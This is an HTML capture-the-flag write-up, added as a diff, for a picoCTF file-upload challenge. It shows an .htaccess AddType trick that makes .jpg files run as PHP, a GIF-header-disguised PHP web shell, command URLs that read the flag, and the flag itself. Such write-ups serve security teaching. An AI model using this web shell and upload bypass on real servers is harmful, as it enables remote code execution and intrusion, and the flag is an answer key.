@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>byp4ss3d - Writeup</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        /* --- Global Variables --- */
+        :root {
+            --bg-color: #f4f4f5;
+            --text-main: #18181b;
+            --text-muted: #52525b;
+            --accent-color: #0d9488;
+            --code-bg: #27272a;
+            --code-text: #4ade80; /* Hacker Green */
+            --font-main: 'Outfit', sans-serif;
+            --font-code: 'Space Mono', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: radial-gradient(#d4d4d8 1px, transparent 1px);
+            background-size: 24px 24px;
+            color: var(--text-main);
+            font-family: var(--font-main);
+            padding: 40px 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* --- Header --- */
+        header {
+            margin-bottom: 40px;
+            border-bottom: 2px solid var(--text-main);
+            padding-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        h1 {
+            font-family: var(--font-code);
+            font-size: 1.5rem;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .back-btn {
+            text-decoration: none;
+            color: var(--text-main);
+            font-family: var(--font-code);
+            font-weight: 700;
+            border: 1px solid var(--text-main);
+            padding: 8px 16px;
+            border-radius: 4px;
+            transition: all 0.3s;
+            font-size: 0.8rem;
+        }
+
+        .back-btn:hover {
+            background-color: var(--text-main);
+            color: #fff;
+        }
+
+        /* --- Content Styling --- */
+        .content {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e4e4e7;
+            box-shadow: 4px 4px 0px rgba(0,0,0,0.05);
+        }
+
+        h2 {
+            font-family: var(--font-code);
+            color: var(--accent-color);
+            margin-top: 30px;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        h3 {
+            font-family: var(--font-main);
+            color: var(--text-main);
+            font-weight: 700;
+            margin-top: 25px;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+
+        p {
+            line-height: 1.8;
+            margin-bottom: 20px;
+            color: var(--text-main);
+        }
+
+        /* Styling the Code Blocks */
+        .code-block {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            font-family: var(--font-code);
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto; 
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            border-left: 4px solid var(--accent-color);
+        }
+
+        /* Styling the "Given Challenge" Quote */
+        blockquote {
+            background-color: #f0fdfa; /* Light Teal */
+            border-left: 4px solid var(--accent-color);
+            padding: 15px;
+            margin-bottom: 25px;
+            font-style: italic;
+            color: var(--text-muted);
+        }
+
+        /* The Flag Styling */
+        .flag {
+            background-color: var(--accent-color);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-family: var(--font-code);
+            font-weight: 700;
+        }
+
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>byp4ss3d Writeup</h1>
+        <a href="../../writeups.html" class="back-btn">Back to List</a>
+    </header>
+
+    <div class="content">
+        
+        <h2>// Given Challenge</h2>
+        <blockquote>
+            A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.
+        </blockquote>
+
+        <p>After launching the instance, I navigated to the website. I initially tried uploading various non-image file formats, but the server rejected them. Checking the hints provided, I noticed a crucial detail:</p>
+        
+        <p><em>"Apache can be tricked into executing non-PHP files as PHP using a .htaccess file"</em></p>
+
+        <p>This confirmed that the goal is to bypass the image upload filter, force the server to execute our payload, and read the flag. A quick scan using <code>ffuf</code> revealed an <code>/images</code> directory, but access was forbidden.</p>
+
+        <h2>// The Configuration Attack</h2>
+        <p>Since we can upload files, we can upload a configuration file to alter how the server handles specific extensions. I created a file named <code>.htaccess</code> with the following content:</p>
+
+        <div class="code-block">
+AddType application/x-httpd-php .jpg
+        </div>
+
+        <h3>Breakdown of the Command:</h3>
+        <ul>
+            <li><strong>AddType:</strong> An Apache directive used to map a specific file extension to a content type (MIME type).</li>
+            <li><strong>application/x-httpd-php:</strong> The MIME type for PHP. It instructs the server to run the file through the PHP processor.</li>
+            <li><strong>.jpg:</strong> Specifies that this rule applies to files ending in <code>.jpg</code>.</li>
+        </ul>
+
+        <p>I uploaded this <code>.htaccess</code> file successfully. Now, any JPG file in that directory will be executed as PHP code.</p>
+
+        <h2>// The Payload</h2>
+        <p>Next, I created a file named <code>shell.jpg</code>. To bypass basic file signature checks, I added the GIF magic bytes at the start:</p>
+
+        <div class="code-block">
+GIF89a;  <br>
+&lt;?php system($_GET['cmd']); ?&gt;
+        </div>
+
+        <p>The <code>GIF89a;</code> header tricks the server into thinking it is a valid image, while the PHP tag contains our command injection payload.</p>
+
+        <h2>// Execution & Flag Retrieval</h2>
+        <p>I accessed the uploaded shell and passed a test command to verify code execution:</p>
+
+        <div class="code-block">
+http://amiable-citadel.picoctf.net:65155/images/shell.jpg?cmd=id
+        </div>
+
+        <p>The server returned <code>uid=33(www-data)</code>, confirming that our payload was successfully executed. With remote code execution secured, I changed the command to read the flag:</p>
+
+        <div class="code-block">
+http://amiable-citadel.picoctf.net:65155/images/shell.jpg?cmd=cat%20/var/www/flag.txt
+        </div>
+
+        <h2>// The Result</h2>
+        <p>The final flag is: <br><br> <span class="flag">picoCTF{s3rv3r_byp4ss_9e7008ba}</span></p>
+
+    </div>
+
+</body>
+</html>
